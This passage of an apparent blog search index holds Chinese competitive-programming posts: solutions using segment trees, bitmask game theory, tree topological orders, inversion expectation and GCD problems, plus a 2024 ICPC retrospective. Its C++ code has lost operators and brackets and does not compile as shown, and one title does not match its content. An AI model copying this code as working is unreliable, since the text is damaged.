((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2024 年度小结","path":"/2025/01/03/summary24/","content":"是稍微迟了一点的有关我编程故事的年度小结。昨天看到洛谷出了年终总结，想了想还是决定分享一些。 其实高中参加信息竞赛以来，很少有和别人分享给具体的经历，更多是悄悄地写在博客里。 我嘛编程的天赋并不多，能坚持这么久更多的是一份热爱。高中三年来，其实周围能和我交流算法的并不多，更多时候是一个人的摸索，碰过无数次的壁才找到最有效的训练方式（当然，还是要感谢李老师和班老师的大力帮助与支持！！！）。在这一年里，我也在初高中进行了竞赛的授课。深知实战在编程中最为重要，为了让他们在竞赛中能少走弯路，我在平日的训练中总是给他们精心准备各种模拟赛，并鼓励他们参加各大平台的比赛。我想，这也算是一种传承吧！【当然，在此说一句—-很高兴在大一的第一学期能为大家答疑解惑 C/Java/Python 上的问题】 NOIP 2023 的结束，也意味着我高中生涯的退役。但幸运的是，在考入港中深后，我能够成功组队，跨入大学生程序竞赛 ICPC/CCPC 的大门。ICPC 系列的赛事是三人一机的模式，题目多且灵活覆盖面广，每道题目没有大样例，而且提交后的状态只有通过与否。相较于高中的 NOIP，可以说 ICPC 的题目完全是另一个高的维度。而且，历年国家队等高水平的选手重新汇聚于此，竞争压力的大小不言而喻。这个赛季组队的很是匆忙，由于预选赛的意外之喜，我们获得了线下区域赛的资格。然而，第一场 ICPC 的南京站就给我们破了一场冷水。陌生的 Linux 系统，热身赛找不到编译器的窘迫，身旁的北大队伍……在种种因素下，我们这场比赛以 2 题告终。当比赛结束的那一刻，我们没有说一句话，但却是不甘的。在回去的飞机上，我们尝试总结了各种问题，想要在 CCPC 重庆站找回属于我们自己的节奏。可是……一周后的 CCPC 重庆站，最终以 5 题打铁结束。这一个赛季结束了，什么奖也没得到…… 不过—没有关系，还有三年多的大学时光！哪里跌倒，就在哪里站起来！回去在和室友分享题目的同时，意外的想出赛时困扰我的题目，也证明了目前我们的发挥尚未到顶，我们仍有提升的空间。于是在接下去的日子里，我积极参与着 CF 和 AT 的比赛。或许不是每一个人都可以理解我每周打比赛，甚至为打有时差的比赛而熬夜。而在我看来，打比赛不仅是实力的提升与享受通过题目后的欣喜，更重要的是可以收获一群志同道合的伙伴（想要感谢的太多就不一一列举了）！在独属于我们程序设计竞赛队的机房中，每次前往总能看到他们在努力训练的身影，这也更加坚信了我会继续在这条路上走下去的信心。 很幸运，在港中深能学习自己热爱的专业。很幸运，能继续参加我所热爱的编程比赛。新的一年，继续加油吧！","categories":["Solution"]},{"title":"题解：CF509C Sums of Digits","path":"/2024/12/31/CF2053F/","content":"对于每一行的 $-1$，显然只会填一种数字，因此可以得出一种比较朴素的 DP。设 $f_{i,j}$ 表示考虑前 $i$ 行，第 $i$ 行的 $-1$ 变为 $j$ 时的最大值，再设 $d_{i,j}$ 表示第 $i$ 行数字 $j$ 的个数，则可列出转移方程： f_{i,j} = \\max \\limits _{o = 1} ^ k\\{f_{i - 1,o} + d_{i - 1,-1} \\times d_{i,o} + d_{i - 1,-1} \\times d_{i,-1}\\} + d_{i - 1,j} \\times d_{i,j} + d_{i - 1,j} \\times d_{i,-1}由于 $d$ 数组可以预处理获得，于是就得到了 $O(nk)$ 的算法。 进一步观察这个方程，发现方程中与 $j$ 无关的量可以直接用线段树区间加处理，与 $j$ 相关的直接单点加（每一行最多只需要 $O(m)$ 次）。于是可以用有区间加，单点加，单点取最大值，最后维护区间最大值的数据结构实现。这里用两个懒标记的线段树去实现，每一次标记下传的时候，加法的懒标记直接累加，而最大值的懒标记需要先作加法后再取最值。最后我们就能得到 $O(nm \\log (k))$ 的算法： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 6e5 + 5;const int MOD = 1e9 + 7;inline int read ();map ll,ll mp[2];ll tree[MAX 2],tmp[MAX 2],mx[MAX 2];int t,n,m,k;void modify (int cur,int l,int r,int x,int y,pair ll,ll p);void pushdown (int cur);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();k = read ();mp[0].clear (); vector vector ll a (n + 5, vector ll (m + 5)); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) a[i][j] = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) ++mp[1][a[i][j]]; for (auto v : mp[1]) if (v.first != -1) modify (1,1,k,v.first,v.first,mp[0][-1] * v.second,0); int mx = tree[1]; modify (1,1,k,1,k,mp[0][-1] * mp[1][-1],0); modify (1,1,k,1,k,0,mx); for (auto v : mp[1]) if (v.first != -1) modify (1,1,k,1,k,mp[0][v.first] * mp[1][v.first],0); for (auto v : mp[0]) if (v.first != -1) modify (1,1,k,v.first,v.first,mp[1][-1] * v.second,0); mp[0].clear (); for (auto v : mp[1]) mp[0][v.first] = v.second; mp[1].clear (); printf (%lld ,tree[1]); for (int i = 0;i = 4 * k;++i) tree[i] = tmp[i] = mx[i] = 0; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void pushdown (int cur) // 注意是先作加法后取 max tree[cur 1] = max (tree[cur 1] + tmp[cur],mx[cur]); tree[cur 1 | 1] = max (tree[cur 1 | 1] + tmp[cur],mx[cur]); tmp[cur 1] += tmp[cur],tmp[cur 1 | 1] += tmp[cur]; mx[cur 1] = max (mx[cur 1] + tmp[cur],mx[cur]);mx[cur 1 | 1] = max (mx[cur 1 | 1] + tmp[cur],mx[cur]); tmp[cur] = mx[cur] = 0; void modify (int cur,int l,int r,int x,int y,pair ll,ll p) if (x = l y = r) tmp[cur] += p.first;mx[cur] = max (mx[cur] + p.first,p.second); tree[cur] = max (tree[cur] + p.first,p.second); return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify (cur 1,l,mid,x,y,p); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,p); tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);","categories":["Solution"]},{"title":"博弈论与状压","path":"/2024/12/28/GameTheory/","content":"Weighted Tic-Tac-Toe 用二进制表示每一格的情况，然后必胜态和必败态需要相互转换。 Remove Pairs 直接状压，时间复杂度 $O(2^nn^2)$。 Exchange Game $dp_{f,st}$ 表示某一方取，状态为 $st$ 时的赢家，由于涉及两方与牌堆，所以用三进制进行状压。放个核心代码： int get (int nw,int p) return nw / pw[p] % 3;int add (int nw,int p,int v) return nw + (v - get (nw,p)) * pw[p]; bool dfs (bool f,int st) if (dp[f][st] != -1) return dp[f][st];//dp[f][st] 表示 f 取，状态为 st 时哪一方赢 for (int i = 0;i N;++i)//出牌 if (get (st,i) != f) continue; for (int j = 0;j N;++j)//拿回 if (get (st,j) != 2 || a[j] = a[i]) continue; if (dfs (f ^ 1,add (add (st,i,2),j,f)) == f) return dp[f][st] = f; if (dfs (f ^ 1,add (st,i,2)) == f) return dp[f][st] = f;//不拿 return dp[f][st] = f ^ 1;","categories":["Algorithm"]},{"title":"树的拓扑序","path":"/2024/12/27/Topo/","content":"定义：一棵有根树形成的任一排列 $p$，若 $i$ 是 $j$ 的父亲，排列 $p$ 均满足 $i$ 在 $j$ 之前。更加形式化的，$\\forall 1 \\le i j \\le n$，$p_j$ 均不是 $p_i$ 的父亲。 结论：设 $f_u$ 表示以 $u$ 为根时该子树的合法拓扑序的数量，$sz_u$ 表示子树大小，则有 $f_u = \\dfrac{sz_u!}{\\prod sz_v \\mid v \\in \\rm{subtree}(u)}$。 以下是证明： 首先考虑二叉树的情况。若以 $u$ 为根，此时每颗子树内的相对顺序是确定的，只需要考虑子树间的相对顺序。故有： f_u = f_{v_1} \\times f_{v_2} \\times \\binom {sz_{v_1} + sz_{v_2}}{sz_{v_1}}若是三叉树，考虑将 $v_1$ 与 $v_2$ 的相对顺序先固定形成一个整体后，再考虑 $v_3$，则可得： f_u = f_{v_1} \\times f_{v_2} \\times f_{v_3} \\times \\binom {sz_{v_1} + sz_{v_2}}{sz_{v_1}} \\times \\binom {sz_{v_1} + sz_{v_2} + sz_{v_3}}{sz_{v_1} + sz_{v_2}} \\\\ = f_{v_1} \\times f_{v_2} \\times f_{v_3} \\times \\dfrac{\\left(sz_{v_1} + sz_{v_2} + sz_{v_3}\\right)!}{sz_{v_1}!sz_{v_2}!sz_{v_3}!}推广到一般，则可推出： f_u = \\left(\\prod \\limits_{v \\in \\rm{son}(u)} f_v\\right)\\times \\dfrac{(sz_u - 1)!}{\\prod \\limits_{v \\in \\rm{son}(u)} (sz_v!)} \\\\ = (sz_u - 1)! \\prod \\limits_{v \\in \\rm{son}(u)} \\left(\\dfrac{f_v}{sz_v!}\\right)再由 $(sz_u - 1)! = \\frac{sz_u!}{sz_u}$ 做进一步的化简： f_u = \\frac{sz_u!}{sz_u} \\prod \\limits_{v \\in \\rm{son}(u)} \\left(\\dfrac{\\dfrac{sz_v!}{sz_v}\\prod \\limits_{p \\in \\rm{son(v)}} \\dfrac{f_p}{sz_p}}{sz_v!}\\right)继续迭代可得： f_u = \\dfrac{sz_u!}{\\prod \\limits_{v \\in \\rm{subtree}(u)}sz_v} Distributing Integers 若以 $1$ 为根答案为 $f_1 = \\dfrac{n!}{\\prod \\limits _{i = 1}^n sz_i}$。而现在需要求以任意一点为根时的答案，故考虑换根 dp。当由 $f_u$ 转移至 $f_v$ 时，只有两点的 $sz$ 发生变化，故可得到转移方程 $f_v = f_u \\times \\frac{n - sz_v}{sz_v}$。两次 dfs 即可求得所有的 $f_i$，暴力逆元维护，时间复杂度 $O(n \\log n)$。 Topology 设 $dp_{i,j}$ 表示节点 $i$ 位于第 $j$ 个位置的方案数。若 $u$ 是 $v$ 的父亲，则当 $dp_{u,i}$ 转移至 $dp_{v,j}$ 时，由于 $u$ 内存在其余子树，为了方便转移，方程中 $dp_{i,j}$ 不考虑子树 $i$ 内的顺序，在统计答案的时候再作更新。当 $dp_{u,i}$ 转移至 $dp_{v,j}$ 时，需要考虑的就是 $u$ 的其余子树在整一拓扑序中的位置，以及 $u$ 的其余子树的相对拓扑序。前者就是用组合数求出在剩余的位置中找 $sz_u - sz_v - 1$ 个将 $u$ 内不含 $v$ 子树内的节点放入的方案数，后者直接套结论。故有： dp_{v,j} = \\sum \\limits_{i = 1}^{j - 1} dp_{u,i} \\times \\binom{n - i - sz_v}{sz_u - sz_v - 1} \\times \\dfrac{(sz_u - sz_v - 1)!}{\\prod \\limits_{w \\in \\rm{subtree}(u) \\land w otin \\rm{subtree}(v)} sz_w}最后的答案便是： dp_{i,i} \\times \\binom{n - i}{sz_i - 1} \\times \\dfrac{sz_i!}{\\prod \\limits_{v \\in \\rm{subtree}(i) }sz_v}注意到转移方程可以前缀和优化，所以最后的时间复杂度是 $O(n^2)$。千万需要先预处理出逆元，$O(n^2 \\log n)$ 的做法在 CF 上会挂。放个核心代码吧： void dfs1 (int u,int fa) sz[u] = prod[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; prod[u] = 1ll * prod[u] * prod[v] % MOD; prod[u] = 1ll * prod[u] * sz[u] % MOD;void dfs2 (int u,int fa) for (auto v : ve[u]) if (v == fa) continue; int tmp = qpow (1ll * prod[u] * inv_prod[v] % MOD * inv_sz[u] % MOD,MOD - 2); for (int j = 1;j = n;++j) ndp[j] = (1ll * dp[u][j] * calc (n - j - sz[v],sz[u] - sz[v] - 1) % MOD + ndp[j - 1]) % MOD; for (int j = 1;j = n;++j) dp[v][j] = 1ll * ndp[j - 1] * f[sz[u] - sz[v] - 1] % MOD * tmp % MOD; dfs2 (v,u);","categories":["Algorithm"]},{"title":"逆序对与期望","path":"/2024/12/26/Inversion/","content":"母题—逆序对与期望 求长度为 $n$ 的排列的期望的逆序对个数。 对于每一对数，是否成为逆序对的概率显然为 $\\frac{1}{2}$，那么就有： E(x) = E(\\sum\\limits_{i,j\\mid i < j}[a_i > a_j])=\\sum\\limits_{i,j\\mid i < j}(E([a_i > a_j]) = \\sum\\limits_{i,j\\mid i < j} \\frac{1}{2} = \\frac{n(n-1)}{4} 变式 $1$ Another Shuffle Window 题意： 每次可以选择一个长度为 $k$ 的连续区间进行重排，求期望的逆序对个数。 每次选择一对 $(a_i,a_j)$ 去考虑是否可以产生贡献。对于一个长度固定的区间，可以分区间内和区间内外分别考虑。对于后者，无论区间内怎么重排，都可以直接计算出与区间外的逆序对数，像滑动窗口一样直接处理即可。 变式 $2$ Inversions After Shuffle 每次可以选择任意长度的连续区间进行重排，求期望的逆序对个数。 根据选择的 $(a_i,a_j)$ 是否会产生贡献从而列出式子，并用数据结构维护。显然所有的区间数为 $C_n^1 + C_n^2 = C_{n + 1}^2 = \\frac{n(n + 1)}{2}$，则对于这一对数（显然此时 $i eq j$），令 $i j$，有 $\\frac{2i(n - j + 1)}{n(n + 1)}$ 的概率被一个区间包含。而 $(a_i,a_j)$ 又有 $\\frac{1}{2}$ 的概率成为逆序对。 若 $a_i,a_j$ 被选中，则贡献的答案为 \\sum \\limits_{i = 1} ^ n \\sum \\limits_{j = i + 1}^n \\frac{1}{2}\\frac{2i(n - j + 1)}{n(n + 1)}\\\\ =(1 \\frac{n(n - 1)}{2} + 2 \\frac{(n - 1)(n - 2)}{2} + \\cdots + n\\frac{1 \\times 0}{2}) \\times \\frac{1}{n(n + 1)}\\\\ = \\frac{1}{2n(n + 1)} \\sum \\limits_{i = 1}^n i(n - i + 1)(n - i)若不被选中，则只有当 $a_i a_j$ 时才会产生贡献，答案为 \\sum \\limits_{i = 1}^n \\sum \\limits_{j = i + 1}^n [1 - \\frac{2i(n - j + 1)}{n(n + 1)}] [a_i > a_j]\\\\ =\\sum \\limits_{i = 1}^n \\sum \\limits_{j = i + 1}^n [a_i > a_j] - \\frac{2}{n(n + 1)}\\sum \\limits_{i = 1}^n (i\\sum \\limits_{j = i + 1}^{n}(n - j + 1)[a_i > a_j])对于前者，直接循环维护即可。对于后者，用树状数组维护逆序对。但需要注意循环枚举应该从后往前，从而保证每次查询时在其之后的数的相对大小已存入树状数组中。 for (int i = n;i;--i) sum += 1.0 * i * query (a[i]); modify (a[i],n - i + 1); 变式 $3$ Inversion Expectation 题意：长度为 $n$ 的排列中有一些数是不确定的，求该排列的逆序对。 分类讨论，共三种情况： 两个已知数构成逆序对 树状数组求解即可。 两个未知数构成逆序对 用母题的结论 $\\frac{n(n - 1)}{4}$ 即可。 一个未知数，一个已知数 设已知数 $a$ 前面的未知数个数为 $k$，比 $a$ 大的未知数个数为 $m$，总共的未知数个数为 $n$，则此时的贡献为 $k \\times \\frac{m}{n}$。那么在后面的比 $a$ 小的未知数的贡献同理。 Shohag Loves Inversions 题意： 初始时 $a = [0,1]$，每次更新将 $a$ 逆序对的数量 $k$ 插入其中，求最终长度为 $n$ 的序列的数量。 以下均设当前的序列逆序对的数量为 $k$。 首先需要通过观察得出一个性质，当序列第一次出现 $k 1$ 的时候，若将 $k$ 插在中间的位置，会使得 $k’ k$，在末尾插入则 $k’ = k$。设 $f_i$ 表示长度为 $i$ 且当前第一次出现 $k 1$ 时，变为长度为 $n$ 的序列的数量。剩下还有 $n - i$ 次操作，可以将 $k$ 均插入末尾，或者在末尾插入若干个以后再将 $k$ 插入中间的 $i$ 个位置之一，因此可以得到以下转移： f_i = i \\times \\sum \\limits_{j = 0}^{n - i - 1} f_{i + j + 1} + 1现在我们讨论整一个序列均为 $k \\le 1$ 的情况。显然 $k = 0$ 时就只有 $\\underbrace{00 \\cdots 0}_{n - 1}1$ 这一种。而 $k = 1$ 时应为 $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$，其中 $x \\in [0,n - 3]$，故有 $n - 2$ 种。所以说，$k \\le 1$ 时，共有 $n - 1$ 种。 最后考虑 $k \\le 1$ 转移至 $k 1$ 的情况，显然只有 $k = 1$ 时才有可能。因此对于 $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ 类型的串，我们需要找到第一个 $1$ 所出现的位置。不难发现第一次出现 $k 1$ 的序列时至少由长度为 $3$ 的 $010$ 转移而来，共会产生 $2$ 个长度为 $4$ 且 $k 1$ 的串 $1010,0110$。一般化的，若在长度为 $i$ 时第一次出现 $k 1$，则这个长度为 $i$ 的串共会有 $\\sum \\limits_{j = 2}^{i - 1} = \\frac{i(i - 3)}{2}$ 种情况。举个例子，若 $i = 5$，则可能由 $0010,0101$ 转移出 $5$ 种情况。 综上所述，最后的答案就是 $n - 1 + \\sum \\limits _{i = 4}^n \\frac{i(i - 3)}{2} f_i$。直接后缀和进行处理即可，时间复杂度 $O(n)$。","categories":["Algorithm"]},{"title":"GCD 题集","path":"/2024/12/20/GCD/","content":"$\\gcd (x,y)$ 求两个数 $x,y(x y)$ 的最大公因数，辗转相除法即可。 int gcd (int x,int y)return !y ? x : gcd (y,x % y); $\\rm lcm(x,y)$ 求两个数 $x,y(x y)$ 的最小公倍数，即求 $\\dfrac{xy}{\\gcd (x,y)}$ 的值，证明如下： 令 $k = \\gcd (x,y)$，则有 $\\gcd (\\frac{x}{k},\\frac{y}{k}) = 1$；对于两个互质的数来说，最小公倍数即为两数的乘积，所以有 $\\rm lcm(x,y) = \\dfrac{xy}{\\gcd (x,y)}$。 P2568 GCD 给定正整数 $n$，求 $1\\le x,y\\le n$ 且 $\\gcd(x,y)$ 为素数的数对 $(x,y)$ 有多少对。 题目即求 $\\displaystyle \\sum_{k \\in prime} \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (i,j) = k]$。 对于 $i,j$ 满足 $\\gcd (i,j) = k$，则有 $\\gcd (\\dfrac{i}{k},\\dfrac{j}{k}) = 1$。所以说，原式等价于： \\displaystyle \\sum_{k \\in prime} \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} [\\gcd (\\frac{i}{k},\\frac{j}{k}) = 1]容易想到欧拉函数的定义，直接转换可得： \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} [\\gcd (\\frac{i}{k},\\frac{j}{k}) = 1] = \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\varphi (i)于是这道题只需要先预处理处 $\\varphi(i)$就能在 $O(n)$ 解决。同时，用欧拉函数预处理出质数，然后在统计时答案应为： \\displaystyle \\sum_{k \\in prime} (2 \\times \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\varphi (i) - 1)显然，对于一个合法的素数对 $(i,j)$， $(j,i)$ 一定也满足条件，但是如果 $i = j$，则需要去重。 P2398 GCD SUM 和上一题有一定的联系，直接推式子： \\displaystyle \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} \\gcd (i,j)\\\\ = \\sum_{k = 1}^{n} \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} k [\\gcd (i,j) = k]\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (i,j) = k])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (\\dfrac{i}{k},\\dfrac{j}{k}) = 1])\\\\ 令 x = \\dfrac{i}{k},y = \\dfrac{j}{k}\\\\ 原式 = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (x,y) = 1])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} [\\gcd (x,y) = 1])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} \\varphi (i))\\\\对于 $\\lfloor \\dfrac{n}{k} \\rfloor$ 的处理，直接分块就能在 $O(\\sqrt n)$ 的时间复杂度下搞定。于是乎，直接预处理即可使整一程序达到 $O(n)$ 的时间复杂度。 Shohag Loves XOR (Easy Version) 题意： 给定 $x,m$，求有多少 $y$ 满足 $y \\in [1,m],x eq y$ 且 $x \\oplus y$ 是 $x$ 或 $y$ 的因子。 结论猜测：$x \\oplus y \\in [1,x)$，下面是证明： 对于一个 $p$ 的因子 $f$，满足 $f \\le \\lfloor \\frac{p}{2} \\rfloor$，也就是说 $f$ 和 $p$ 在二进制下的最高位不同。 当 $y \\ge 2x$ 时，$x \\oplus y$ 与 $y$ 在二进制下的最高位相同，所以 $x \\oplus y$ 在此时必定不是 $y$ 的因子。同时，由于最高位的不同，此时 $x \\oplus y x$ 一定成立，所以 $x \\oplus y$ 同样也不是 $x$ 的因子。 所以说，只有 $y 2x$ 时，才能满足题意，也就是说因子 $x \\oplus y x$。 Shohag Loves XOR (Hard Version) 给定 $x,m$，求有多少 $y$ 满足 $y \\in [1,m]$ 使得 $x \\oplus y$ 可以被 $x$ 或 $y$ 整除。 设 $p = x \\oplus y$，分三种情况讨论： $x | p$。设 $p = kx$，则 $y = x \\oplus p \\le p + x \\le m$，也就是 $kx \\le m - x$，进一步化简可知 $k \\le \\lfloor \\frac{m - x}{x} \\rfloor$。由于我们还有 $(m - x,m]$ 区间未检测，但可以充分利用 $x \\oplus y \\le x + y$ 这个性质，我们循环判断 $(m - x,m + x]$ 区间即可（当然，官方解答的做法更加简洁，但是没看懂）。 $y | p$。当 $0 x y$ 时，$p \\le x + y y + y = 2y$，因此 $p = ky(k \\ge 2)$ 不存在解。因此只需要考虑 $y \\le x$ 的情况。 $x | p$ 且 $y | p$。当 $x eq y$ 时，$\\rm{lcm(x,y)} \\ge 2 \\max (x,y)$，然而 $p 2 \\max (x,y)$，因此只有 $x = y$ 时才能成立。 GCD等于XOR 题意： 求 $\\sum_{x=1}^{n}\\sum_{y=1}^{n}[\\gcd(x,y)=(x\\oplus y)]$。 若 $x = y$，答案显然成立。下面令 $x y$，设 $x = \\gcd(x,y) \\times x’,y = \\gcd(x,y) \\times y’$。同时，注意到异或特有的性质 $x - y \\le x \\oplus y \\le x + y$，则可列出不等式： \\gcd(x,y) \\le \\gcd (x,y) \\times (x'-y') \\le x - y \\le x \\oplus y\\le x + y于是当 $\\gcd (x,y) = x \\oplus y$ 成立时当且仅当 $\\gcd (x,y) = x \\oplus y = x - y$。因此枚举预处理即可。 Shohag Loves GCD 题意： 从给定集合中选数并构造序列 $\\{a_i\\}$，需要满足 $a_{\\gcd (i,j)} eq \\gcd(a_i,a_j) \\mid \\forall 1 \\le i j \\le n$ 并且构造出的序列字典序最大。 不妨从反面分析，考虑满足 $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$。当 $i \\mid j$ 时，$\\gcd (i,j) = i$，$a_i \\mid a_j$。进一步的，当 $i mid j$ 时，是否也存在一个 $i$，满足 $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ 呢？ 假设存在这个 $i$，我们设 $g = \\gcd (i,j)$，那么 $a_g = \\gcd (a_i,a_j)$ 且 $g i$。由于 $g \\mid i$，等价于 $g = \\gcd (g,i)$，由上面的结论可知 $a_{\\gcd (g,i)} = \\gcd (a_g,a_i)$。此时与题目的条件不符合，故假设不成立。 GCD Guess 题意： 每次询问 $a,b$ 返回 $\\gcd (x + a,x + b)$ 的值，最终求出 $x$。 由数据范围不难想到按位考虑。 在二进制条件下，设最低位为第 $0$ 位。目前要猜测第 $i$ 位的值，设 $t$ 表示前 $i - 1$ 位所贡献的值。令 $a b$，则有（加粗表示第 $i$ 位）： \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ t + b \\text{ changes to } 1\\textbf{1}0\\cdots 0\\ \\end{cases}由公式 $\\gcd (t + a,t + b) = \\gcd (t + a,b - a)$ 可知（加粗表示第 $i$ 位）： \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ b - a \\text{ changes to } 1\\textbf{0}00\\cdots 0\\ \\end{cases}此时 $\\gcd (t + a,b - a) = 2^i$。当实际 $x$ 的第 $i$ 位为 $1$ 时，会产生 $2$ 次进位，使得 $\\gcd (t’ + a,b - a) = 2^{i + 1}$。因此可以得到以下代码： for (int i = 0;i 30;++i)//猜测第 i 位 int ans = query ((1 i) - x,(1 i) + (1 (i + 1)) - x); if (ans == 1 (i + 1)) x |= 1 i; Guess Numbers 题意： 每次询问 $(a,b)$，返回 $\\gcd (x + a,y + b)$ 的值，求出 $x,y$。 先用 $(0,0),(0,1),(1,0)$ 最多三次即可确定最低位。之后先将最低 $x$ 位全部弄成 $1$（相当于每次询问的时候取反），然后 $+1$ 即可变为全为 $0$ 的形式，并将当前询问位取反。用类似的方式，每一位最多三次即可得到答案。 void solve () ll x = 0,y = 0,dx = 0,dy = 0; ll g = query (0,0); if (g % 2 == 0) dx |= 1,dy |= 1; else g = query (1,0); if (g % 2 == 0) x |= 1,dy |= 1; else g = query (0,1); if (g % 2 == 0) y |= 1,dx |= 1; else x |= 1,y |= 1; ll b = 1; for (int i = 1;i 60;++i) g = query (dx + 1,dy + 1); if ((g b) % 2 == 0) x |= 1ll i,y |= 1ll i; else g = query (dx + 1 + (1ll i),dy + 1); if ((g b) % 2 == 0) dx |= 1ll i,y |= 1ll i; else g = query (dx + 1,dy + 1 + (1ll i)); if ((g b) % 2 == 0) dy |= 1ll i,x |= 1ll i; else dx |= 1ll i,dy |= 1ll i; ++b; printf (! %lld %lld ,x,y);fflush (stdout); Maximum modulo equality 题意： 对于一个询问 $[l,r]$，找到最大的 $m$ 满足 $\\forall i,j \\in [l,r]$，均满足 $a_i \\mod m = a_j \\mod m$。 条件转换成 $|a_i - a_j| \\mod m = 0$，因此对于一个询问，在形成差分后维护区间的 $\\gcd$ 即可。 Coprime Pair同 Problem about GCD 【后者为复杂版本】 题意： 找到 $l,r \\in [x,y]$ 满足 $\\gcd (l,r) = g$ 且 $r - l + 1$ 尽可能的大的一对（若答案仍不唯一，取 $l$ 最小的。 先给结论：先将其转换为前者的题目 $\\gcd (l,r) = 1$ 的情况，然后直接暴力枚举 $l,r$ 之间的差值以及 $l$ 的值，前者从大到小枚举，后者从小到大，找到后就直接 break。 听着有点荒谬，但确实不会超时。于是就有了这个问题： $n$ 以内相邻质数差的数量级？ 虽然题目和互质数相关，但是显然可以归约到 Prime Gap 问题上来。目前数学界的猜测是 $\\ln$ 级别，相关文献 Prime Gap。","categories":["Algorithm"]},{"title":"题解：CF2044H Hard Demon Problem","path":"/2024/12/18/CF2044H/","content":"将行和列分开考虑。 在每组询问 $(x_1,y_1,x_2,y_2)$ 中： 对于每一行，相邻的两个数的下标差为 $1$。 对于每一列，相邻的两个数的下标差为 $y_2 - y_1 + 1$。 不难想到对行和列分别做 $i \\times a_{i,j}$ 和 $j \\times a_{i,j}$ 的前缀和处理。由于列的下标之差不为 $1$，所以需要先对其做扩大倍数的处理后再将其相加。设最终要求的 $\\sum i a_i$ 的 $i$ 为系数，那么对于一组询问，可以得到以下系数矩阵： \\scriptstyle \\begin{bmatrix} y_1 + x_1(y_2 - y_1 + 1) & y_1 + 1 + x_1(y_2 - y_1 + 1) & \\cdots & y_2 + x_1(y_2 - y_1 + 1)\\\\ y_1 + (x_1 + 1)(y_2 - y_1 + 1) & y_1 + 1 + (x_1 + 1)(y_2 - y_1 + 1) & \\cdots & y_2 + (x_1 + 1)(y_2 - y1 + 1)\\\\ \\vdots & \\vdots & \\vdots & \\vdots\\\\ y_1 + x_2(y_2 - y_1 + 1) & y_1 + 1 + x_2(y_2 - y_1 + 1) & \\cdots & y_2 + x_2(y_2 - y_1 + 1) \\end{bmatrix}然而正确的系数矩阵应为： \\scriptstyle \\begin{bmatrix} 1 & 2 & \\cdots & y_2 - y_1 + 1\\\\ y_2 - y_1 + 2 & y_2 - y_1 + 3 & \\cdots & 2(y_2 - y_1 + 1)\\\\ \\vdots & \\vdots & \\vdots & \\vdots\\\\ (x_2 - x_1)(y_2 - y_1 + 1) + 1 & (x_2 - x_1)(y_2 - y_1 + 1) + 2 & \\cdots & (x_2 - x_1 + 1)(y_2 - y_1 + 1) \\end{bmatrix}将矩阵中的每一个数字都减去 $x_1(y_2 - y_1 + 1) + y_1 - 1$ 次即可，也就是再维护一个普通的二维前缀和后处理。总时间复杂度为 $O(t(n^2 + q))$，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e3 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,q; ll sum[MAX][MAX],sumx[MAX][MAX],sumy[MAX][MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();q = read (); for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) int x = read (); sum[i][j] = x + sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1]; sumx[i][j] = i * x + sumx[i - 1][j] + sumx[i][j - 1] - sumx[i - 1][j - 1]; sumy[i][j] = j * x + sumy[i - 1][j] + sumy[i][j - 1] - sumy[i - 1][j - 1];; while (q--) int sx = read (),sy = read (),fx = read (),fy = read (); ll s = sum[fx][fy] - sum[sx - 1][fy] - sum[fx][sy - 1] + sum[sx - 1][sy - 1]; ll sum_x = sumx[fx][fy] - sumx[sx - 1][fy] - sumx[fx][sy - 1] + sumx[sx - 1][sy - 1]; ll sum_y 